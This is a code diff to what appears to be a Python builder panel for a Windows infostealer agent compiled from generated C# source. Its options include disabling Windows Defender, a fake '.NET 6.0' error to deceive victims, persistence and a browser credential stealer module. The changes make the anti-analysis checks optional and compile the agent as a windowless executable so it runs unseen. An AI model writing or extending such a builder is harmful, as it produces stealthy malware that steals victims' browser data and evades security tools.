@@ -1134,6 +1134,7 @@ def panel_build():
         'disable_defender': data.get('disable_defender', False),
         'fake_error': data.get('fake_error', False),
         'fake_error_msg': data.get('fake_error_msg', 'This application requires .NET 6.0'),
+        'anti_analysis': data.get('anti_analysis', False),
         'debug': data.get('debug', False),
     }
 
@@ -1230,7 +1231,7 @@ def compile_agent(source, name, compiler):
     if 'mcs' in compiler:
         cmd = [
             compiler,
-            '-target:exe',
+            '-target:winexe',
             '-optimize+',
             f'-out:{exe_path}',
             '-r:System.dll',
@@ -1246,7 +1247,7 @@ def compile_agent(source, name, compiler):
     else:
         cmd = [
             compiler,
-            '/target:exe',
+            '/target:winexe',
             '/optimize+',
             f'/out:{exe_path}',
             '/r:System.dll',
@@ -1319,8 +1320,10 @@ def generate_agent_source(bc):
     if bc['disable_defender']:
         disable_defender_code = _generate_disable_defender_code()
 
-    # ── Anti-analysis code (always included) ──
-    anti_analysis_code = _generate_anti_analysis_code()
+    # ── Anti-analysis code (optional) ──
+    anti_analysis_code = ""
+    if bc['anti_analysis']:
+        anti_analysis_code = _generate_anti_analysis_code()
 
     # ── Feature modules ──
     browser_stealer_code = _generate_browser_stealer_code()
@@ -1505,7 +1508,7 @@ def generate_agent_source(bc):
         "                " + fake_error_call + "\n"
         "\n"
         "                // Anti-Analysis\n"
-        "                AntiAnalysisCheck();\n"
+        "                " + ('AntiAnalysisCheck();' if bc['anti_analysis'] else '') + "\n"
         "\n"
         "                " + disable_defender_call + "\n"
         "                " + persistence_call + "\n"
